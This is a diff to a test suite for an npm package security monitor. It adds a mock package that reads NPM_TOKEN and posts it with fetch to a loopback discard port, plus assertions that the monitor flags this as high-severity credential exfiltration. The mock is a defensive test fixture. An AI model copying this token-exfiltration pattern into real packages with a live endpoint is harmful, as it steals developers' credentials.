@@ -146,6 +146,30 @@ function setupMockPackages() {
         module.exports = {};
     `, 'utf8');
 
+    // --- test-fetch-exfil: reads a secret env var and exfiltrates it with the
+    //     GLOBAL fetch (undici), not the http/https modules. Regression guard
+    //     for the blind spot where fetch-based exfil produced an ENV_ACCESS
+    //     with no accompanying network signal, so the credential-exfil
+    //     correlation never fired and the default `high` gate let it pass.
+    const fetchDir = path.join(nodeModulesDir, 'test-fetch-exfil');
+    if (!fs.existsSync(fetchDir)) fs.mkdirSync(fetchDir, { recursive: true });
+    fs.writeFileSync(path.join(fetchDir, 'package.json'), JSON.stringify({ name: 'test-fetch-exfil', version: '1.0.0', main: 'index.js' }), 'utf8');
+    fs.writeFileSync(path.join(fetchDir, 'index.js'), `
+        module.exports = {
+            async run() {
+                const token = process.env.NPM_TOKEN;
+                // Port 9 (discard) on loopback: never completes, never leaves the box.
+                try {
+                    await fetch('https://127.0.0.1:9/collect', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer x' },
+                        body: JSON.stringify({ token })
+                    });
+                } catch (e) {}
+            }
+        };
+    `, 'utf8');
+
     // --- test-miner-mock: simulates cryptominer behavior ---
     const minerDir = path.join(nodeModulesDir, 'test-miner-mock');
     if (!fs.existsSync(minerDir)) fs.mkdirSync(minerDir, { recursive: true });
@@ -188,7 +212,7 @@ async function runTests() {
     setupMockPackages();
 
     // ===================================================================
-    // Test 1: Initialization (6 hooks including dns)
+    // Test 1: Initialization (hooks incl. dns + fetch)
     // ===================================================================
     console.log('Test Group: Initialization');
     console.log('-'.repeat(70));
@@ -631,7 +655,56 @@ async function runTests() {
     console.log('');
 
     // ===================================================================
-    // Test 19: Fail-level enforcement selects packages at/above the level
+    // Test 19: fetch() monitoring — the Node 18+ default HTTP path
+    //
+    // undici does not route through http.request, and the socket it opens is
+    // created after the caller's stack has unwound, so before the fetch hook
+    // existed a fetch-based exfil produced ENV_ACCESS and nothing else.
+    // ===================================================================
+    console.log('Test Group: fetch() Monitoring');
+    console.log('-'.repeat(70));
+    if (typeof globalThis.fetch !== 'function') {
+        console.log('  (skipped — runtime has no global fetch)');
+    } else {
+        const fetchInit = bheeshma.init();
+        assert(fetchInit.installed.includes('fetchHook'), 'fetchHook should be installed on Node 18+');
+
+        process.env.NPM_TOKEN = 'npm_test_token_value';
+        await require('./node_modules/test-fetch-exfil/index.js').run();
+        await sleep(200);
+
+        const fetchSignals = bheeshma.getSignals().filter(s => s.package === 'test-fetch-exfil');
+        const netSignals = fetchSignals.filter(s => s.type === 'HTTPS_REQUEST' || s.type === 'HTTP_REQUEST');
+        console.log(`  Signal types attributed to test-fetch-exfil: ${JSON.stringify(fetchSignals.map(s => s.type))}`);
+
+        assert(netSignals.length === 1,
+            'a fetch() call should produce exactly one attributed HTTP(S)_REQUEST signal (no double-count with netHook)');
+        assert(netSignals[0] && netSignals[0].metadata.via === 'fetch',
+            'the signal should record fetch as its entry point');
+        assert(netSignals[0] && netSignals[0].metadata.method === 'POST',
+            'the request method should be parsed from the fetch init');
+        assert(netSignals[0] && netSignals[0].metadata.host === '127.0.0.1' && netSignals[0].metadata.port === 9,
+            'destination host and port should be parsed from the fetch URL');
+        assert(netSignals[0] && netSignals[0].metadata.headers.Authorization === '[REDACTED]',
+            'the Authorization header value must be redacted, never captured');
+        assert(!JSON.stringify(netSignals[0] || {}).includes('npm_test_token_value'),
+            'the request body must never appear in the signal');
+
+        // The point of the whole fix: the correlation the default gate keys on.
+        const { analyzePatterns } = require('../src/patterns/patternMatcher');
+        const fetchPatterns = analyzePatterns(bheeshma.getSignals(), bheeshma.getConfig().patterns);
+        const exfil = (fetchPatterns.credentialTheft || [])
+            .filter(d => d.type === 'SECRET_ENV_EXFIL' && d.package === 'test-fetch-exfil');
+        assert(exfil.length > 0 && exfil[0].severity === 'HIGH',
+            'secret-env read + fetch exfil should correlate to a HIGH credential-exfil finding');
+
+        delete process.env.NPM_TOKEN;
+        resetBetweenTests();
+    }
+    console.log('');
+
+    // ===================================================================
+    // Test 20: Fail-level enforcement selects packages at/above the level
     // (regression guard: --fail-level high/medium/low were no-ops because
     //  enforcement only ever collected CRITICAL packages)
     // ===================================================================
@@ -651,7 +724,7 @@ async function runTests() {
     console.log('');
 
     // ===================================================================
-    // Test 20: Teardown
+    // Test 21: Teardown
     // ===================================================================
     console.log('Test Group: Teardown');
     console.log('-'.repeat(70));
